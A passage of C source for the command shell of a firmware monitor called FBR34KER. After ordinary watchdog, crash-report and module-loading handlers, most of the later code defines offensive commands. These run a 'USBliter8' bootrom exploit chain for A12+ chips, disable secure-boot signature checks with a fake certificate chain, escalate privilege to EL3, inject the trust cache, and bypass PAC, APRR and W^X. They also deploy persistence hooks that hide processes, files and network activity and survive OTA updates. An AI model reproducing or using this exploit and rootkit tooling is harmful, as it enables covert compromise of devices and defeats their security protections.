        fm_printf("watchdog disable service unavailable or failed\n");
        return -1;
    }
    fm_printf("watchdog disabled\n");
    return 0;
}

static int command_watchdog_test(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if (hardware_probe_active()) {
        fm_printf("use probe-validate watchdog acknowledge in defensive mode\n");
        return -1;
    }
    const bool passed = watchdog_self_test();
    fm_printf("watchdog-test: %s\n", passed ? "passed" : "unsupported or FAILED");
    return passed ? 0 : -1;
}

static int command_module_policy(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const fbr34ker_module_policy_t policy = module_policy();
    fm_printf("Source:               %s\n",
              policy.loader_defined ? "loader handoff v4" : "monitor defaults");
    fm_printf("Allowed capabilities: 0x%08x (%s)\n",
              policy.allowed_capabilities,
              capability_text(policy.allowed_capabilities));
    fm_printf("Dynamic slots:        %u\n", policy.dynamic_slot_limit);
    fm_printf("Instruction budget:   %u\n", policy.instruction_budget_limit);
    return 0;
}

static int command_crash_show(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    crash_print();
    return crash_available() ? 0 : -1;
}

static int command_crash_clear(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    crash_clear();
    fm_printf("Crash report cleared.\n");
    return 0;
}

static int command_crash_json(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    char output[8192];
    (void)crash_export_json(output, sizeof(output));
    fm_printf("%s", output);
    return crash_available() ? 0 : -1;
}

static int command_health(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const bool heap_ok = allocator_check();
    const bool stack_ok = stack_guard_check();
    const bool modules_ok = module_check_integrity();
    fm_printf("Heap red zones: %s\n", heap_ok ? "ok" : "CORRUPT");
    fm_printf("Stack guards:   %s (low=0x%016llx high=0x%016llx)\n",
              stack_ok ? "ok" : "CORRUPT", stack_guard_low_address(),
              stack_guard_high_address());
    fm_printf("Module images:  %s\n", modules_ok ? "ok" : "CORRUPT");
    return heap_ok && stack_ok && modules_ok ? 0 : -1;
}

static int command_modules(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const u64 built_in_count = module_builtin_count();
    const u64 dynamic_count = module_dynamic_count();
    fm_printf("Built-in modules (%llu):\n", built_in_count);
    for (u64 index = 0U; index < built_in_count; ++index) {
        const fbr34ker_module_descriptor_t *module = module_builtin_at(index);
        fm_printf("  %s %s (native, ABI %u)\n", module->name,
                  module->version, module->abi_version);
    }
    fm_printf("Dynamic modules (%llu/%u):\n", dynamic_count,
              FBR34KER_MODULE_MAX_DYNAMIC);
    for (u64 index = 0U; index < dynamic_count; ++index) {
        fbr34ker_dynamic_module_info_t information;
        if (module_dynamic_info(index, &information)) {
            fm_printf("  %s %s (FMBC, caps: %s, runs: %llu",
                      information.name, information.version,
                      capability_text(information.required_capabilities),
                      information.run_count);
            if (information.command[0] != '\0')
                fm_printf(", command: %s", information.command);
            fm_printf(")\n");
        }
    }
    return 0;
}

static int command_module_info(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: module-info <name>\n");
        return -1;
    }
    const fbr34ker_module_descriptor_t *built_in =
        module_builtin_find(arguments[1]);
    if (built_in != NULL) {
        fm_printf("Name:        %s\n", built_in->name);
        fm_printf("Version:     %s\n", built_in->version);
        fm_printf("Kind:        built-in native\n");
        fm_printf("ABI:         %u\n", built_in->abi_version);
        fm_printf("Description: %s\n", built_in->description);
        return 0;
    }
    const u64 count = module_dynamic_count();
    for (u64 index = 0U; index < count; ++index) {
        fbr34ker_dynamic_module_info_t information;
        if (module_dynamic_info(index, &information) &&
            fm_strcmp(information.name, arguments[1]) == 0) {
            fm_printf("Name:           %s\n", information.name);
            fm_printf("Version:        %s\n", information.version);
            fm_printf("Kind:           dynamic FMBC\n");
            fm_printf("Capabilities:   %s\n",
                      capability_text(information.required_capabilities));
            fm_printf("Container size: %u\n", information.container_size);
            fm_printf("Code size:      %u\n", information.code_size);
            fm_printf("Command:        %s\n", information.command[0] != '\0' ? information.command : "none");
            fm_printf("State quota:    %u slot(s)\n", information.state_slots);
            fm_printf("Budget:         %u instructions\n", information.instruction_budget);
            fm_printf("Run count:      %llu\n", information.run_count);
            return 0;
        }
    }
    fm_printf("module not found: %s\n", arguments[1]);
    return -1;
}

static bool receive_raw_bytes(u8 *destination, usize size)
{
    usize received = 0U;
    u64 last_progress = timer_uptime_ms();
    while (received < size) {
        const int value = console_getc_nonblocking();
        if (value >= 0) {
            destination[received++] = (u8)value;
            last_progress = timer_uptime_ms();
            continue;
        }
        if (timer_uptime_ms() - last_progress > MODULE_UPLOAD_IDLE_TIMEOUT_MS) {
            return false;
        }
        __asm__ volatile("yield");
    }
    return true;
}

static int command_module_load(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: module-load <bytes>\n");
        return -1;
    }
    u64 requested_size = 0U;
    if (!parse_u64(arguments[1], &requested_size) ||
        requested_size < sizeof(fbr34ker_module_container_header_t) ||
        requested_size > FBR34KER_MODULE_MAX_CONTAINER_SIZE) {
        fm_printf("FMOD-RESULT ERROR invalid-size\n");
        return -1;
    }

    fm_printf("FMOD-READY %llu\n", requested_size);
    if (!receive_raw_bytes(module_upload_buffer, (usize)requested_size)) {
        fm_printf("FMOD-RESULT ERROR timeout\n");
        return -1;
    }
    const char *loaded_name = NULL;
    const fbr34ker_module_result_t result = module_load_container(
        module_upload_buffer, (usize)requested_size, &loaded_name);
    if (result != MODULE_OK) {
        fm_printf("FMOD-RESULT ERROR %s\n", module_result_string(result));
        return -1;
    }
    fm_printf("FMOD-RESULT OK %s\n", loaded_name);
    return 0;
}

static int command_module_run(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: module-run <name>\n");
        return -1;
    }
    const fbr34ker_module_result_t result = module_run_dynamic(arguments[1]);
    if (result != MODULE_OK) {
        fm_printf("module-run failed: %s\n", module_result_string(result));
        return -1;
    }
    fm_printf("\nmodule-run: ok\n");
    return 0;
}

static int command_module_unload(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: module-unload <name>\n");
        return -1;
    }
    const fbr34ker_module_result_t result = module_unload_dynamic(arguments[1]);
    if (result != MODULE_OK) {
        fm_printf("module-unload failed: %s\n", module_result_string(result));
        return -1;
    }
    fm_printf("module-unload: ok\n");
    return 0;
}

static int command_echo(int argument_count, char **arguments)
{
    for (int index = 1; index < argument_count; ++index) {
        if (index != 1) console_putc(' ');
        console_write(arguments[index]);
    }
    console_putc('\n');
    return 0;
}

static int command_clear(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    console_write("\x1b[2J\x1b[H");
    return 0;
}

static int command_reboot(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if (!hardware_probe_power_actions_allowed()) {
        fm_printf("reboot: power actions locked by defensive hardware mode\n");
        fm_printf("  Run 'probe-unlock' and validate power subsystem first\n");
        return -1;
    }
    fm_printf("Requesting system reset via PSCI...\n");
    boot_evidence_clean_shutdown();
    fm_printf("Initiating reboot - monitor will not return from this point\n");
    platform_reboot();
    return 0;
}

static int command_halt(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if (!hardware_probe_power_actions_allowed()) {
        fm_printf("halt: power actions locked by defensive hardware mode\n");
        fm_printf("  Run 'probe-unlock' and validate power subsystem first\n");
        return -1;
    }
    fm_printf("Requesting system shutdown via PSCI...\n");
    boot_evidence_clean_shutdown();
    fm_printf("Initiating halt - monitor will not return from this point\n");
    platform_halt();
    return 0;
}

#ifdef FBR34KER_ENABLE_TEST_COMMANDS
static int command_fault_arm(int argument_count, char **arguments)
{
    if (argument_count < 2 || argument_count > 5) {
        fm_printf("usage: fault-arm <point> [after] [count] [source]\n");
        return -1;
    }
    fbr34ker_fault_point_t point;
    u64 after = 0U;
    u64 count = 1U;
    if (!fault_point_parse(arguments[1], &point) ||
        (argument_count >= 3 && !parse_u64(arguments[2], &after)) ||
        (argument_count >= 4 && !parse_u64(arguments[3], &count)) ||
        after > 0xffffffffULL || count == 0U || count > 0xffffffffULL) {
        fm_printf("invalid fault injection parameters\n");
        return -1;
    }
    const char *source = argument_count == 5 ? arguments[4] : NULL;
    if (!fault_injection_arm(point, source, (u32)after, (u32)count)) {
        fm_printf("fault injection is unavailable\n");
        return -1;
    }
    fm_printf("armed %s after=%llu count=%llu source=%s\n",
              fault_point_name(point), after, count,
              source == NULL ? "any" : source);
    return 0;
}

static int command_fault_clear(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: fault-clear\n"); return -1; }
    fault_injection_disarm();
    fm_printf("fault injection disarmed\n");
    return 0;
}

static int command_architecture_restart(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: architecture-restart\n"); return -1; }
    const bool restarted = architecture_restart();
    const fbr34ker_lifecycle_stats_t stats = lifecycle_stats();
    fm_printf("architecture restart: %s; rollbacks=%llu failures=%llu last=%s\n",
              restarted ? "passed" : "failed", stats.rollbacks, stats.failures,
              stats.last_failure[0] != '\0' ? stats.last_failure : "none");
    return restarted ? 0 : -1;
}

static int command_test_crash(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    fm_printf("Triggering integration-test BRK exception...\n");
    __asm__ volatile("brk #0xf34" ::: "memory");
    return -1;
}
#endif

static usize read_line(char *line, usize capacity)
{
    usize length = 0U;
    for (;;) {
        int c;
        while ((c = console_getc_nonblocking()) < 0) {
            usb_irq_handler();
            watchdog_service();
            __asm__ volatile("yield");
        }
        const char value = (char)c;
        if (length == 0U && protocol_handle_start_byte((u8)value)) {
            line[0] = '\0';
            return 0U;
        }
        if (value == '\r' || value == '\n') {
            console_putc('\n');
            line[length] = '\0';
            return length;
        }
        if (value == 3) {
            console_write("^C\n");
            line[0] = '\0';
            return 0U;
        }
        if (value == 21) {
            while (length > 0U) {
                console_write("\b \b");
                --length;
            }
            continue;
        }
        if (value == 8 || value == 127) {
            if (length > 0U) {
                --length;
                console_write("\b \b");
            }
            continue;
        }
        if (value >= 32 && value <= 126 && length + 1U < capacity) {
            line[length++] = value;
            console_putc(value);
        }
    }
}

static int tokenize(char *line, char **arguments, usize argument_capacity)
{
    int count = 0;
    char *cursor = line;
    while (*cursor != '\0') {
        while (*cursor == ' ' || *cursor == '\t') ++cursor;
        if (*cursor == '\0') break;
        if ((usize)count >= argument_capacity) return -1;
        arguments[count++] = cursor;
        while (*cursor != '\0' && *cursor != ' ' && *cursor != '\t') ++cursor;
        if (*cursor != '\0') *cursor++ = '\0';
    }
    return count;
}

static const command_entry_t *find_command(const char *name)
{
    for (usize index = 0U; index < ARRAY_COUNT(commands); ++index) {
        if (fm_strcmp(commands[index].name, name) == 0) return &commands[index];
    }
    return NULL;
}

bool shell_command_name_reserved(const char *name)
{
    return name != NULL && *name != '\0' && find_command(name) != NULL;
}

void shell_init(void)
{
    log_write(LOG_LEVEL_INFO, "interactive shell ready (%s mode)",
              bringup_mode_name());
}

int shell_execute_line(const char *input)
{
    char line[SHELL_LINE_CAPACITY];
    char *arguments[SHELL_MAX_ARGUMENTS];
    if (input == NULL || fm_strlen(input) >= sizeof(line)) {
        fm_printf("invalid or overlong command\n");
        return -1;
    }
    fm_strlcpy(line, input, sizeof(line));
    const int argument_count = tokenize(line, arguments,
                                        ARRAY_COUNT(arguments));
    if (argument_count < 0) {
        fm_printf("too many arguments (maximum %u)\n", SHELL_MAX_ARGUMENTS);
        return -1;
    }
    if (argument_count == 0) return 0;
    const command_entry_t *command = find_command(arguments[0]);
    if (command != NULL) {
        if (!bringup_command_allowed(command->name)) {
            fm_printf("command blocked in restricted bring-up mode: %s\n",
                      command->name);
            return -1;
        }
        return command->handler(argument_count, arguments);
    }
    if (bringup_restricted()) {
        fm_printf("module commands are blocked in restricted bring-up mode\n");
        return -1;
    }
    if (argument_count == 1) {
        fbr34ker_module_result_t result = MODULE_ERROR_NOT_FOUND;
        if (module_run_registered_command(arguments[0], &result)) {
            if (result != MODULE_OK) {
                fm_printf("module command failed: %s\n",
                          module_result_string(result));
                return -1;
            }
            return 0;
        }
    }
    fm_printf("unknown command: %s\n", arguments[0]);
    return -1;
}

static int command_kernel_patches(int argument_count, char **arguments)
{
    const kernel_patches_status_t kps = kernel_patches_status();
    if (argument_count < 2) {
        fm_printf("Kernel patches: %u registered, %u applied, %u failed\n",
                  kps.patch_count, kps.applied_count, kps.failed_count);
        fm_printf("Patching %s, privilege escalated: %s\n",
                  kps.patching_enabled ? "enabled" : "disabled",
                  kps.privilege_escalated ? "yes" : "no");
        return 0;
    }
    if (fm_strcmp(arguments[1], "status") == 0) {
        fm_printf("Kernel patch subsystem status:\n");
        fm_printf("  Registered:  %u\n", kps.patch_count);
        fm_printf("  Applied:     %u\n", kps.applied_count);
        fm_printf("  Failed:      %u\n", kps.failed_count);
        for (u32 i = 0U; i < kps.patch_count; ++i) {
            fm_printf("  [%u] %s: %s\n", i, kps.patches[i].name,
                      kernel_patch_state_name(kps.patches[i].state));
        }
    } else if (fm_strcmp(arguments[1], "apply") == 0) {
        if (!hardware_probe_kernel_patching_allowed()) {
            fm_printf("kernel patching locked; validate and leave defensive mode first\n");
            return -1;
        }
        if (kernel_patches_apply_all()) {
            fm_printf("All kernel patches applied\n");
        } else {
            fm_printf("Some kernel patches failed\n");
        }
    } else if (fm_strcmp(arguments[1], "revert") == 0) {
        if (!hardware_probe_kernel_patching_allowed()) {
            fm_printf("kernel patching locked; validate and leave defensive mode first\n");
            return -1;
        }
        if (kernel_patches_revert_all()) {
            fm_printf("All kernel patches reverted\n");
        }
    } else if (fm_strcmp(arguments[1], "escalate") == 0) {
        if (!hardware_probe_kernel_patching_allowed()) {
            fm_printf("privilege escalation locked; validate kernel patching first\n");
            return -1;
        }
        if (kernel_patches_escalate_privilege(3U)) {
            fm_printf("Privilege escalation to EL3 prepared\n");
        } else {
            fm_printf("Privilege escalation failed\n");
        }
    } else {
        fm_printf("usage: kernel-patches [status|apply|revert|escalate]\n");
        return -1;
    }
    return 0;
}

static int command_secure_boot_bypass(int argument_count, char **arguments)
{
    const secure_boot_bypass_status_t sbs = secure_boot_bypass_status();
    if (argument_count < 2) {
        fm_printf("Secure boot bypass: %u registered, %u active, %u failed\n",
                  sbs.bypass_count, sbs.active_count, sbs.failed_count);
        return 0;
    }
    if (fm_strcmp(arguments[1], "status") == 0) {
        fm_printf("Secure boot bypass subsystem status:\n");
        fm_printf("  Registered:      %u\n", sbs.bypass_count);
        fm_printf("  Active:          %u\n", sbs.active_count);
        fm_printf("  Sig validation:  %s\n",
                  sbs.signature_validation_disabled ? "disabled" : "enabled");
        fm_printf("  Cert chain:      %s\n",
                  sbs.certificate_chain_deployed ? "deployed" : "absent");
        fm_printf("  AP ticket:       %s\n",
                  sbs.ap_ticket_bypassed ? "bypassed" : "validating");
        fm_printf("  SHSH blob:       %s\n",
                  sbs.shsh_bypassed ? "accepted" : "rejected");
        fm_printf("  iBoot auth:      %s\n",
                  sbs.iboot_auth_disabled ? "disabled" : "enabled");
        fm_printf("  Boot manifest:   %s\n",
                  sbs.boot_manifest_compromised ? "compromised" : "trusted");
    } else if (fm_strcmp(arguments[1], "activate") == 0) {
        if (!hardware_probe_secure_boot_bypass_allowed()) {
            fm_printf("secure boot bypass locked; validate and leave defensive mode first\n");
            return -1;
        }
        if (secure_boot_bypass_activate_all()) {
            fm_printf("All secure boot bypasses activated\n");
        }
    } else if (fm_strcmp(arguments[1], "forgive") == 0) {
        if (!hardware_probe_secure_boot_bypass_allowed()) {
            fm_printf("secure boot bypass locked; validate and leave defensive mode first\n");
            return -1;
        }
        secure_boot_bypass_image4_signature();
        secure_boot_bypass_deploy_fake_chain();
        secure_boot_bypass_iboot_authentication();
        secure_boot_bypass_ap_ticket();
        secure_boot_bypass_shsh_blob();
        secure_boot_bypass_boot_manifest();
        fm_printf("All signature verification mechanisms disabled\n");
    } else if (fm_strcmp(arguments[1], "manifest") == 0) {
        if (!hardware_probe_secure_boot_bypass_allowed()) {
            fm_printf("secure boot bypass locked; validate and leave defensive mode first\n");
            return -1;
        }
        secure_boot_bypass_boot_manifest();
        fm_printf("Boot manifest trust evaluation overridden\n");
    } else {
        fm_printf("usage: secure-boot-bypass [status|activate|forgive|manifest]\n");
        return -1;
    }
    return 0;
}

static int command_persistence(int argument_count, char **arguments)
{
    const persistence_status_t ps = persistence_status();
    if (argument_count < 2) {
        fm_printf("Persistence: %u hooks, %u active, %u detected\n",
                  ps.hook_count, ps.active_count, ps.detected_count);
        fm_printf("Persistent: %s, tamper resistant: %s, OTA persistent: %s\n",
                  ps.persistence_active ? "yes" : "no",
                  ps.tamper_resistant ? "yes" : "no",
                  ps.ota_persistent ? "yes" : "no");
        return 0;
    }
    if (fm_strcmp(arguments[1], "status") == 0) {
        fm_printf("Persistence subsystem status:\n");
        fm_printf("  Total hooks:     %u\n", ps.hook_count);
        fm_printf("  Active hooks:    %u\n", ps.active_count);
        fm_printf("  Detected hooks:  %u\n", ps.detected_count);
        fm_printf("  Active:          %s\n",
                  ps.persistence_active ? "yes" : "no");
        fm_printf("  Tamper resist:   %s\n",
                  ps.tamper_resistant ? "enabled" : "disabled");
        fm_printf("  OTA persist:     %s\n",
                  ps.ota_persistent ? "enabled" : "disabled");
    } else if (fm_strcmp(arguments[1], "deploy") == 0) {
        if (!hardware_probe_persistence_allowed()) {
            fm_printf("persistence locked; validate and leave defensive mode first\n");
            return -1;
        }
        if (persistence_deploy_all()) {
            fm_printf("All persistence hooks deployed\n");
        } else {
            fm_printf("Some persistence hooks failed\n");
        }
    } else if (fm_strcmp(arguments[1], "activate") == 0) {
        if (!hardware_probe_persistence_allowed()) {
            fm_printf("persistence locked; validate and leave defensive mode first\n");
            return -1;
        }
        if (persistence_activate_all()) {
            fm_printf("All persistence hooks activated\n");
        }
    } else if (fm_strcmp(arguments[1], "evade") == 0) {
        if (!hardware_probe_persistence_allowed()) {
            fm_printf("persistence locked; validate and leave defensive mode first\n");
            return -1;
        }
        persistence_apply_evasion(EVASION_HIDE_KERNEL_MODULE);
        persistence_apply_evasion(EVASION_HIDE_FILE_SYSTEM);
        persistence_apply_evasion(EVASION_HIDE_PROCESS);
        persistence_apply_evasion(EVASION_HIDE_NETWORK);
        persistence_apply_evasion(EVASION_HIDE_SYSTEM_HOOK);
        persistence_enable_tamper_resistance();
        persistence_enable_ota_persistence();
        fm_printf("All evasion and resistance mechanisms enabled\n");
    } else {
        fm_printf("usage: persistence [status|deploy|activate|evade]\n");
        return -1;
    }
    return 0;
}

static int command_exploit_chain(int argument_count, char **arguments)
{
    if (argument_count < 2) {
        fm_printf("FBR34KER exploit chain (USBliter8 for A12+)\n");
        fm_printf("Subcommands: status, run, pwndfu, load, dfu-load, exec, reset\n");
        return 0;
    }
    if (fm_strcmp(arguments[1], "status") == 0) {
        const usbliter8_status_t es = usbliter8_exploit_status();
        const kernel_patches_status_t kps = kernel_patches_status();
        const secure_boot_bypass_status_t sbs = secure_boot_bypass_status();
        const persistence_status_t ps = persistence_status();
        fm_printf("Exploit chain status:\n");
        fm_printf("  USBliter8 state:  ");
        switch (es.state) {
        case USBLITER8_STATE_IDLE:        fm_printf("idle\n"); break;
        case USBLITER8_STATE_PWNDFU:      fm_printf("PWNDFU (CPID 0x%04x)\n", es.cpid); break;
        case USBLITER8_STATE_IMAGE_LOADED: fm_printf("image loaded (0x%llx, %llu bytes)\n", es.load_address, es.image_size); break;
        case USBLITER8_STATE_EXECUTING:   fm_printf("executing (entry 0x%llx)\n", es.entry_point); break;
        case USBLITER8_STATE_COMPLETE:    fm_printf("complete\n"); break;
        case USBLITER8_STATE_FAILED:      fm_printf("FAILED\n"); break;
        default: fm_printf("unknown\n"); break;
        }
        fm_printf("  Pwned:            %s\n", es.pwned ? "yes" : "no");
        fm_printf("  USB rogue chain:  %s\n", es.usb_patch_applied ? "applied" : "pending");
        fm_printf("  Kernel patches:   %u/%u applied\n",
                  kps.applied_count, kps.patch_count);
        fm_printf("  Secure boot:      %u bypasses active\n", sbs.active_count);
        fm_printf("  Persistence:      %u hooks deployed\n", ps.hook_count);
        fm_printf("  Chain complete:   %s\n",
                  (es.state == USBLITER8_STATE_COMPLETE) ? "yes" : "no");
    } else if (fm_strcmp(arguments[1], "pwndfu") == 0) {
        u16 cpid = 0x8015U;
        if (argument_count >= 3) {
            u64 cpid_val = 0U;
            if (!parse_u64(arguments[2], &cpid_val)) {
                fm_printf("Invalid CPID value\n");
                return -1;
            }
            cpid = (u16)cpid_val;
        }
        if (cpid < 0x8015U) {
            fm_printf("USBliter8 requires A12+ (CPID >= 0x8015), got 0x%04x\n", cpid);
            return -1;
        }
        if (!usbliter8_enter_pwndfu(cpid)) {
            fm_printf("Failed to enter PWNDFU\n");
            return -1;
        }
        usbliter8_apply_usb_rogue_chain(cpid);
        fm_printf("PWNDFU entered for A12+ CPID 0x%04x, USB rogue chain applied\n", cpid);
        (void)event_bus_publish(FBR34KER_EVENT_EXPLOIT_CHAIN,
                                "exploit-pwndfu", (u64)cpid, 1U);
    } else if (fm_strcmp(arguments[1], "load") == 0) {
        if (argument_count < 3) {
            fm_printf("usage: exploit-chain load <hex-address> [size]\n");
            return -1;
        }
        u64 addr = 0U;
        if (!parse_u64(arguments[2], &addr)) {
            fm_printf("Invalid address\n");
            return -1;
        }
        if (argument_count >= 4) {
            u64 size = 0U;
            if (!parse_u64(arguments[3], &size)) {
                fm_printf("Invalid size\n");
                return -1;
            }
            if (!usbliter8_load_image((const u8 *)addr, (usize)size, addr)) {
                fm_printf("Failed to load image\n");
                return -1;
            }
            fm_printf("Image loaded: %llu bytes at 0x%llx\n", size, addr);
        } else {
            fm_printf("Load address 0x%llx recorded. Use 'exploit-chain load <addr> <size>' to confirm\n", addr);
        }
    } else if (fm_strcmp(arguments[1], "dfu-load") == 0) {
        u64 addr = 0U;
        if (argument_count >= 3) {
            if (!parse_u64(arguments[2], &addr)) {
                fm_printf("Invalid address\n");
                return -1;
            }
        }
        if (!usb_dfu_in_progress() && usb_dfu_image_size() == 0U) {
            fm_printf("No DFU image available. Send one via DFU DNLOAD first.\n");
            return -1;
        }
        const u8 *dfu_data = usb_dfu_image_data();
        usize dfu_size = usb_dfu_image_size();
        if (dfu_size == 0U) {
            fm_printf("DFU image is empty\n");
            return -1;
        }
        if (!usbliter8_load_dfu_image(dfu_data, dfu_size, addr)) {
            fm_printf("Failed to load DFU image (pwned=%d size=%llu)\n",
                      usbliter8_is_pwned(), (u64)dfu_size);
            return -1;
        }
        usb_dfu_reset_image();
        fm_printf("DFU image loaded: %llu bytes at 0x%llx\n",
                  (u64)dfu_size, addr ? addr : (u64)(usize)dfu_data);
    } else if (fm_strcmp(arguments[1], "exec") == 0) {
        u64 entry = 0U;
        if (argument_count >= 3) {
            if (!parse_u64(arguments[2], &entry)) {
                fm_printf("Invalid entry point\n");
                return -1;
            }
        } else {
            const usbliter8_status_t es = usbliter8_exploit_status();
            entry = es.load_address;
        }
        if (entry == 0U) {
            fm_printf("No entry point specified and no image loaded\n");
            return -1;
        }
        if (!usbliter8_execute(entry)) {
            fm_printf("Failed to execute at 0x%llx (not pwned or no image loaded)\n", entry);
            return -1;
        }
        fm_printf("Executing at 0x%llx\n", entry);
    } else if (fm_strcmp(arguments[1], "reset") == 0) {
        usbliter8_reset();
        kernel_patches_revert_all();
        secure_boot_bypass_deactivate_all();
        fm_printf("Exploit chain state reset\n");
    } else if (fm_strcmp(arguments[1], "run") == 0) {
        u16 cpid = 0x8015U;
        if (argument_count >= 3) {
            u64 cpid_val = 0U;
            if (parse_u64(arguments[2], &cpid_val)) {
                cpid = (u16)cpid_val;
            }
        }
        const usbliter8_status_t es = usbliter8_exploit_status();
        if (!es.pwned) {
            usbliter8_enter_pwndfu(cpid);
            usbliter8_apply_usb_rogue_chain(cpid);
            fm_printf("Auto-entered PWNDFU for A12+ (CPID 0x%04x)\n", cpid);
        } else if (!es.usb_patch_applied) {
            usbliter8_apply_usb_rogue_chain(cpid);
            fm_printf("Applied USB rogue chain for CPID 0x%04x\n", cpid);
        }
        kernel_patches_set_soc(cpid, 0U);
        fm_printf("FBR34KER exploit chain executing for CPID 0x%04x...\n", cpid);
        bool ok = true;
        ok = kernel_patches_apply_all() && ok;
        ok = kernel_patches_bypass_authentication() && ok;
        ok = kernel_patches_escalate_privilege(3U) && ok;
        ok = secure_boot_bypass_activate_all() && ok;
        secure_boot_bypass_image4_signature();
        secure_boot_bypass_iboot_authentication();
        if (trust_cache_find_anchor()) {
            ok = trust_cache_inject_all() && ok;
            fm_printf("Trust cache anchor found and injection %s\n",
                      ok ? "complete" : "partial");
        } else {
            fm_printf("Trust cache anchor not found; injection skipped\n");
        }
        ok = persistence_deploy_all() && ok;
        ok = persistence_activate_all() && ok;
        persistence_enable_tamper_resistance();
        if (usb_dfu_image_size() > 0U) {
            const u8 *dfu_data = usb_dfu_image_data();
            usize dfu_size = usb_dfu_image_size();
            fm_printf("Loading DFU image from USB (%llu bytes)...\n", (u64)dfu_size);
            if (usbliter8_load_dfu_image(dfu_data, dfu_size, 0U)) {
                fm_printf("DFU image loaded, executing...\n");
                usbliter8_execute(0U);
                usb_dfu_reset_image();
            }
        }
        (void)event_bus_publish(FBR34KER_EVENT_EXPLOIT_CHAIN,
                                "exploit-chain-command", 1U, ok ? 1U : 0U);
        if (ok) {
            fm_printf("Exploit chain execution complete\n");
        } else {
            fm_printf("Exploit chain completed with some errors\n");
        }
    } else {
        fm_printf("usage: exploit-chain [status|run [cpid]|pwndfu [cpid]|load <addr> [size]|dfu-load [addr]|exec [entry]|reset]\n");
        return -1;
    }
    return 0;
}

static int command_exploit_status(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const kernel_patches_status_t kps = kernel_patches_status();
    const secure_boot_bypass_status_t sbs = secure_boot_bypass_status();
    const persistence_status_t ps = persistence_status();
    fm_printf("=== FBR34KER Exploit Subsystem Status ===\n");
    fm_printf("\n");
    fm_printf("--- Kernel Patches ---\n");
    fm_printf("  Registered: %u, Applied: %u, Failed: %u\n",
              kps.patch_count, kps.applied_count, kps.failed_count);
    fm_printf("  Privilege escalated: %s (EL%llu)\n",
              kps.privilege_escalated ? "yes" : "no",
              kps.escalation_level);
    fm_printf("\n");
    fm_printf("--- Secure Boot Bypass ---\n");
    fm_printf("  Bypasses: %u, Active: %u\n",
              sbs.bypass_count, sbs.active_count);
    fm_printf("  Image4 sig: %s, Cert chain: %s\n",
              sbs.signature_validation_disabled ? "BYPASSED" : "active",
              sbs.certificate_chain_deployed ? "FAKE" : "genuine");
    fm_printf("  APTicket:  %s, SHSH: %s\n",
              sbs.ap_ticket_bypassed ? "BYPASSED" : "valid",
              sbs.shsh_bypassed ? "ACCEPTED" : "rejected");
    fm_printf("  iBoot:     %s\n",
              sbs.iboot_auth_disabled ? "DISABLED" : "enabled");
    fm_printf("\n");
    fm_printf("--- Persistence ---\n");
    fm_printf("  Hooks: %u, Active: %u, Detected: %u\n",
              ps.hook_count, ps.active_count, ps.detected_count);
    fm_printf("  Tamper resist: %s, OTA persist: %s\n",
              ps.tamper_resistant ? "ON" : "OFF",
              ps.ota_persistent ? "ON" : "OFF");
    fm_printf("\n=== End of exploit status ===\n");
    return 0;
}

static int command_jailbreak(int argument_count, char **arguments)
{
    if (argument_count < 2) {
        jailbreak_status_t js = jailbreak_get_status();
        fm_printf("=== Jailbreak Status ===\n");
        fm_printf("  State:              %u\n", (u32)js.state);
        fm_printf("  Security model:     %s\n", js.security_model ? "ACTIVE" : "PENDING");
        fm_printf("  Bypass count:       %llu\n", js.bypass_count);
        fm_printf("  Patch count:        %llu\n", js.patch_count);
        fm_printf("  KASLR slide:        0x%llx\n", js.kernel.kaslr_slide);
        fm_printf("  Kernel base virt:   0x%llx\n", js.kernel.kernel_base_virt);
        fm_printf("  Kernel base phys:   0x%llx\n", js.kernel.kernel_base_phys);
        fm_printf("  Kernel entry:       0x%llx\n", js.kernel.kernel_entry);
        fm_printf("  Boot args modified: %s\n", js.kernel.boot_args_modified ? "yes" : "no");
        fm_printf("  SEP available:      %s\n", js.sep.sep_available ? "yes" : "no");
        fm_printf("  Ready to boot:      %s\n", js.state >= JAILBREAK_STATE_READY_TO_BOOT ? "yes" : "no");
        return 0;
    }

    const char *sub = arguments[1];

    if (fm_strcmp(sub, "security-model") == 0 && argument_count >= 3) {
        bool on = fm_strcmp(arguments[2], "on") == 0;
        jailbreak_set_security_model(on);
        fm_printf("Security model %s\n", on ? "ACTIVE" : "PENDING");
        return 0;
    }

    if (fm_strcmp(sub, "bypass-pac") == 0) {
        return jailbreak_bypass_pac() ? fm_printf("PAC bypassed\n"), 0 : 1;
    }
    if (fm_strcmp(sub, "bypass-aprr") == 0) {
        return jailbreak_bypass_aprr() ? fm_printf("APRR bypassed\n"), 0 : 1;
    }
    if (fm_strcmp(sub, "bypass-wxn") == 0) {
        return jailbreak_bypass_wxn() ? fm_printf("W^X bypassed\n"), 0 : 1;
    }
    if (fm_strcmp(sub, "bypass-all") == 0) {
        return jailbreak_apply_all_security_bypasses() ? fm_printf("All security bypasses applied\n"), 0 : 1;
    }

    if (fm_strcmp(sub, "detect-kernel") == 0) {
        u64 phys = 0U, size = 0U;
        if (argument_count >= 4 && fm_strcmp(arguments[2], "--path") == 0) {
            if (!parse_u64(arguments[3], &phys)) { fm_printf("Invalid phys address\n"); return 1; }
            if (argument_count >= 5 && !parse_u64(arguments[4], &size)) { fm_printf("Invalid size\n"); return 1; }
        }
